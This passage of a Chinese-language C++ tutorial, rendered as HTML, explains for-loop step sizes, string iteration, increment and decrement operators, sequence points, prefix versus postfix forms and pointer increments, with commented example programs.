class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; count &lt;&lt; <span class="string">&quot;...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Liftoff!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-1-3-修改步长"><a href="#5-1-3-修改步长" class="headerlink" title="5.1.3 修改步长"></a>5.1.3 修改步长</h3><p><code>for</code> 循环的更新部分不一定总是加 1 或减 1。你可以根据需要指定任何有效的更新表达式。</p><p><strong>示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 以步长 2 递增，打印偶数</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Even numbers less than 10:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i = i + <span class="number">2</span>) &#123; </span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; i &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 0 2 4 6 8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 以步长 5 递减</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Counting down by 5s:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> n = <span class="number">50</span>; n &gt;= <span class="number">0</span>; n = n - <span class="number">5</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; n &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 50 45 40 35 30 25 20 15 10 5 0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用乘法作为步长 (注意避免无限循环)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Powers of 2 less than 100:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> p = <span class="number">1</span>; p &lt; <span class="number">100</span>; p = p * <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; p &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 1 2 4 8 16 32 64</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-1-4-使用for循环访问字符串"><a href="#5-1-4-使用for循环访问字符串" class="headerlink" title="5.1.4 使用for循环访问字符串"></a>5.1.4 使用for循环访问字符串</h3><p><code>for</code> 循环是遍历字符串（无论是 C 风格字符串还是 <code>std::string</code> 对象）中每个字符的常用方法。</p><p><strong>示例 (C 风格字符串):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt; // 为了 strlen()</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> message[] = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(message); <span class="comment">// 获取字符串长度 (不包括 \0)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Characters in \&quot;&quot;</span> &lt;&lt; message &lt;&lt; <span class="string">&quot;\&quot;:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i = i + <span class="number">1</span>) &#123; <span class="comment">// 索引从 0 到 len-1</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Index &quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;: &quot;</span> &lt;&lt; message[i] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 也可以使用指针和空字符判断</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Characters using pointer:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">char</span> *p = message; *p != <span class="string">&#x27;\0&#x27;</span>; p = p + <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; *p &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>示例 (std::string):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> word = <span class="string">&quot;World&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Characters in \&quot;&quot;</span> &lt;&lt; word &lt;&lt; <span class="string">&quot;\&quot;:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// 使用 size() 获取长度，size_t 通常是合适的索引类型</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; word.size(); i = i + <span class="number">1</span>) &#123; </span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Index &quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;: &quot;</span> &lt;&lt; word[i] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// C++11 基于范围的 for 循环 (更简洁，见 5.4)</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; &quot;Characters using range-based for:&quot; &lt;&lt; std::endl;</span></span><br><span class="line">    <span class="comment">// for (char ch : word) &#123;</span></span><br><span class="line">    <span class="comment">//     std::cout &lt;&lt; ch &lt;&lt; &quot; &quot;;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; std::endl;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-1-5-递增运算符（-）和递减运算符（–）"><a href="#5-1-5-递增运算符（-）和递减运算符（–）" class="headerlink" title="5.1.5 递增运算符（++）和递减运算符（–）"></a>5.1.5 递增运算符（++）和递减运算符（–）</h3><p>C++ 提供了两个非常有用的运算符来简化变量加 1 或减 1 的操作：</p><ul><li>  <strong>递增运算符 (<code>++</code>):</strong> 将操作数的值增加 1。</li><li>  <strong>递减运算符 (<code>--</code>):</strong> 将操作数的值减少 1。</li></ul><p>它们可以用于整数类型、浮点类型和指针类型。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">double</span> value = <span class="number">10.5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 递增</span></span><br><span class="line">    count++; <span class="comment">// 等价于 count = count + 1; 现在 count 是 6</span></span><br><span class="line">    ++value; <span class="comment">// 等价于 value = value + 1; 现在 value 是 11.5</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Count after increment: &quot;</span> &lt;&lt; count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value after increment: &quot;</span> &lt;&lt; value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 递减</span></span><br><span class="line">    count--; <span class="comment">// 等价于 count = count - 1; 现在 count 是 5</span></span><br><span class="line">    --value; <span class="comment">// 等价于 value = value - 1; 现在 value 是 10.5</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Count after decrement: &quot;</span> &lt;&lt; count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value after decrement: &quot;</span> &lt;&lt; value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在 for 循环中使用</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Loop using ++:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; ++i) &#123; <span class="comment">// 使用 ++i 或 i++ 效果相同 (作为独立语句)</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;i = &quot;</span> &lt;&lt; i &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-1-6-副作用和顺序点"><a href="#5-1-6-副作用和顺序点" class="headerlink" title="5.1.6 副作用和顺序点"></a>5.1.6 副作用和顺序点</h3><p><strong>副作用 (Side Effect):</strong> 指的是修改变量的值或执行 I/O 操作等改变程序状态的行为。递增 (<code>++</code>) 和递减 (<code>--</code>) 运算符都具有副作用，因为它们会修改操作数的值。</p><p><strong>顺序点 (Sequence Point):</strong> 是程序执行过程中的一个时间点，在该点之前的所有副作用都已完成，并且后续的副作用尚未发生。C++ 标准定义了一些顺序点，例如：</p><ul><li>  分号 <code>;</code> (语句结束处)</li><li>  完整表达式结束时（如 <code>if</code> 条件、<code>while</code> 条件、<code>for</code> 循环的三个部分之后）</li><li>  函数调用之前（所有参数的副作用完成）</li><li>  某些运算符（如 <code>&amp;&amp;</code>, <code>||</code>, <code>,</code> 逗号运算符）的特定位置</li></ul><p><strong>重要性:</strong> 在两个顺序点之间，<strong>不要</strong>对同一个变量进行多次修改，或者既修改它又读取它（除了读取它的值以计算要写入的值之外）。否则，行为是**未定义的 (Undefined Behavior)**，编译器可能产生任何结果。</p><p><strong>示例 (未定义行为):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">int</span> y;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 未定义行为: 在同一表达式中多次修改 x，且没有顺序点分隔</span></span><br><span class="line">    <span class="comment">// y = (x++) * (x++); // 不要这样写! 结果不可预测</span></span><br><span class="line">    <span class="comment">// y = x + (++x);     // 不要这样写! 结果不可预测</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; x &lt;&lt; (++x); // 不要这样写! 输出顺序和 x 的最终值不可预测</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 安全的写法: 使用顺序点分隔副作用</span></span><br><span class="line">    y = x++; <span class="comment">// y 获取 x 的原始值 5, 然后 x 变为 6 (副作用在分号处完成)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;y = &quot;</span> &lt;&lt; y &lt;&lt; <span class="string">&quot;, x = &quot;</span> &lt;&lt; x &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 y = 5, x = 6</span></span><br><span class="line">    </span><br><span class="line">    y = ++x; <span class="comment">// x 先变为 7, 然后 y 获取新值 7 (副作用在分号处完成)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;y = &quot;</span> &lt;&lt; y &lt;&lt; <span class="string">&quot;, x = &quot;</span> &lt;&lt; x &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 y = 7, x = 7</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>结论:</strong> 避免在单个表达式中对同一变量产生复杂的、依赖于副作用顺序的操作。将它们分解成多个语句通常更安全、更清晰。</p><h3 id="5-1-7-前缀格式和后缀格式"><a href="#5-1-7-前缀格式和后缀格式" class="headerlink" title="5.1.7 前缀格式和后缀格式"></a>5.1.7 前缀格式和后缀格式</h3><p>递增 (<code>++</code>) 和递减 (<code>--</code>) 运算符都有两种使用形式：</p><ol><li><strong>前缀 (Prefix):</strong> 运算符放在操作数之前 (<code>++x</code>, <code>--x</code>)。<ul><li>  <strong>行为:</strong> <strong>先</strong>修改操作数的值（加 1 或减 1），<strong>然后</strong>使用修改后的值作为整个表达式的结果。</li></ul></li><li><strong>后缀 (Postfix):</strong> 运算符放在操作数之后 (<code>x++</code>, <code>x--</code>)。<ul><li>  <strong>行为:</strong> <strong>先</strong>使用操作数的<strong>原始值</strong>作为整个表达式的结果，<strong>然后</strong>再修改操作数的值（加 1 或减 1）。</li></ul></li></ol><p><strong>区别在于表达式的值:</strong></p><table><thead><tr><th align="left">表达式</th><th align="left">行为描述</th><th align="left">表达式的值</th><th align="left">操作数最终值</th></tr></thead><tbody><tr><td align="left"><code>++x</code></td><td align="left">先将 <code>x</code> 加 1</td><td align="left"><code>x</code> 的新值</td><td align="left">新值</td></tr><tr><td align="left"><code>x++</code></td><td align="left">先使用 <code>x</code> 的原始值</td><td align="left"><code>x</code> 的原始值</td><td align="left">新值</td></tr><tr><td align="left"><code>--x</code></td><td align="left">先将 <code>x</code> 减 1</td><td align="left"><code>x</code> 的新值</td><td align="left">新值</td></tr><tr><td align="left"><code>x--</code></td><td align="left">先使用 <code>x</code> 的原始值</td><td align="left"><code>x</code> 的原始值</td><td align="left">新值</td></tr></tbody></table><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">5</span>, b = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">int</span> result_a, result_b;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 前缀递增</span></span><br><span class="line">    result_a = ++a; <span class="comment">// a 先变成 6, 然后 result_a 被赋值为 6</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Prefix: result_a = &quot;</span> &lt;&lt; result_a &lt;&lt; <span class="string">&quot;, a = &quot;</span> &lt;&lt; a &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 6, 6</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 后缀递增</span></span><br><span class="line">    result_b = b++; <span class="comment">// result_b 先被赋值为 b 的原始值 5, 然后 b 变成 6</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Postfix: result_b = &quot;</span> &lt;&lt; result_b &lt;&lt; <span class="string">&quot;, b = &quot;</span> &lt;&lt; b &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 5, 6</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在 for 循环更新部分，通常前缀和后缀效果相同</span></span><br><span class="line">    <span class="comment">// 但在复杂表达式中，它们的区别很重要</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> arr[] = &#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 使用后缀获取值并移动索引</span></span><br><span class="line">    <span class="keyword">int</span> val1 = arr[index++]; <span class="comment">// val1 = arr[0] (10), index 变为 1</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;val1 = &quot;</span> &lt;&lt; val1 &lt;&lt; <span class="string">&quot;, index = &quot;</span> &lt;&lt; index &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 使用前缀移动索引并获取值</span></span><br><span class="line">    index = <span class="number">0</span>; <span class="comment">// 重置 index</span></span><br><span class="line">    <span class="keyword">int</span> val2 = arr[++index]; <span class="comment">// index 先变为 1, val2 = arr[1] (20)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;val2 = &quot;</span> &lt;&lt; val2 &lt;&lt; <span class="string">&quot;, index = &quot;</span> &lt;&lt; index &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>性能建议:</strong> 对于内置类型（如 <code>int</code>, <code>double</code>, 指针），前缀和后缀的性能差异通常可以忽略。但对于用户定义的类类型（迭代器等），<strong>前缀形式 (<code>++it</code>) 通常比后缀形式 (<code>it++</code>) 效率更高</strong>，因为后缀形式需要创建一个临时对象来保存原始值。因此，在不需要使用原始值的情况下，养成优先使用前缀递增/递减的习惯是好的。</p><h3 id="5-1-8-递增-递减运算符和指针"><a href="#5-1-8-递增-递减运算符和指针" class="headerlink" title="5.1.8 递增/递减运算符和指针"></a>5.1.8 递增/递减运算符和指针</h3><p><code>++</code> 和 <code>--</code> 运算符可以应用于指针，其效果是使指针指向内存中的下一个或上一个<strong>元素</strong>。编译器会自动根据指针指向的数据类型的大小来调整地址。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">double</span> arr[<span class="number">3</span>] = &#123;<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>&#125;;</span><br><span class="line">    <span class="keyword">double</span> *ptr = arr; <span class="comment">// ptr 指向 arr[0]</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Initial pointer: &quot;</span> &lt;&lt; ptr &lt;&lt; <span class="string">&quot;, value: &quot;</span> &lt;&lt; *ptr &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 指向 1.1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 前缀递增指针</span></span><br><span class="line">    ++ptr; </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After ++ptr:     &quot;</span> &lt;&lt; ptr &lt;&lt; <span class="string">&quot;, value: &quot;</span> &lt;&lt; *ptr &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 指向 2.2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 后缀递增指针</span></span><br><span class="line">    ptr++;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After ptr++:     &quot;</span> &lt;&lt; ptr &lt;&lt; <span class="string">&quot;, value: &quot;</span> &lt;&lt; *ptr &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 指向 3.3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 前缀递减指针</span></span><br><span class="line">    --ptr;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After --ptr:     &quot;</span> &lt;&lt; ptr &lt;&lt; <span class="string">&quot;, value: &quot;</span> &lt;&lt; *ptr &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 指向 2.2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 后缀递减指针</span></span><br><span class="line">    ptr--;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After ptr--:     &quot;</span> &lt;&lt; ptr &lt;&lt; <span class="string">&quot;, value: &quot;</span> &lt;&lt; *ptr &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 指向 1.1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 结合解引用 (注意优先级)</span></span><br><span class="line">    ptr = arr; <span class="comment">// 重置</span></span><br><span class="line">    <span class="keyword">double</span> val;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// *ptr++ : 获取 ptr 当前指向的值，然后 ptr 指向下一个元素 (后缀 ++ 优先级高于 *)</span></span><br><span class="line">    val = *ptr++; </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;val = *ptr++ : val = &quot;</span> &lt;&lt; val &lt;&lt; <span class="string">&quot;, ptr now points to value &quot;</span> &lt;&lt; *ptr &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// val=1.1, ptr 指向 2.2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// *++ptr : ptr 先指向下一个元素，然后获取新指向的值 (前缀 ++ 优先级高于 *)</span></span><br><span class="line">    ptr = arr; <span class="comment">// 重置</span></span><br><span class="line">    val = *++ptr;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;val = *++ptr : val = &quot;</span> &lt;&lt; val &lt;&lt; <span class="string">&quot;, ptr now points to value &quot;</span> &lt;&lt; *ptr &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// val=2.2, ptr 指向 2.2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ++*ptr : 获取 ptr 指向的值，然后将该值加 1 (解引用 * 优先级高于前缀 ++)</span></span><br><span class="line">    ptr = 